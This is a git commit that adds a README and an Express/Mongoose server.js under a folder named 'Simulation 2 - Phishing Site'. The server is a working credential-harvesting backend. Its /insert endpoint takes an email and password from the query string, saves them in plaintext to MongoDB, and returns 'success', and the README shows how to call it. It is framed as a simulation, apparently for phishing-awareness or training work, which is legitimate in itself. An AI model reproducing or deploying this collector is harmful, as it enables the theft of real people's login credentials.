8d32a408e11287ec26f67efb68b7a55ebdede97d
kuc <49013038+kuc@users.noreply.github.com>
2022-11-14 13:53:06 -0600

    reupload

---
+++ Simulation 2 - Phishing Site/api/README.md
@@ -0,0 +1,21 @@
+# API Server
+## Modules Used
+- Express
+- Mongoose
+- Body-parser
+
+# Setup server.js
+```bash
+npm init
+```
+```bash
+npm i express body-parser mongoose
+```
+```bash
+node server.js
+```
+
+# To Call API
+```url
+https://EXAMPLE.com/insert?email=[EMAIL]&password=[PASSWORD]
+```
---
+++ Simulation 2 - Phishing Site/api/server.js
@@ -0,0 +1,34 @@
+const express = require('express');
+const app = express();
+const mongoose = require('mongoose');
+const bodyParser = require('body-parser');
+
+app.use(bodyParser.urlencoded({extended: true}));
+
+mongoose.connect("MONGODB URL", { useNewUrlParser: true}, { useUnifiedTopology: true})
+
+//create data schema
+const dataSchema = {
+    email: String,
+    password: String
+} 
+
+const Data = mongoose.model("Data", dataSchema);
+
+app.get("/", function(req, res) {
+    res.send("you shouldnt be here");
+})
+
+app.get("/insert", function(req, res){
+    let newData = new Data({
+        email: req.query.email,
+        password: req.query.password
+    });
+    newData.save();
+    res.send("success");
+});
+
+var port = process.env.PORT || 3000;
+app.listen(port, function() {
+    console.log('Express started on port 3000');
+})
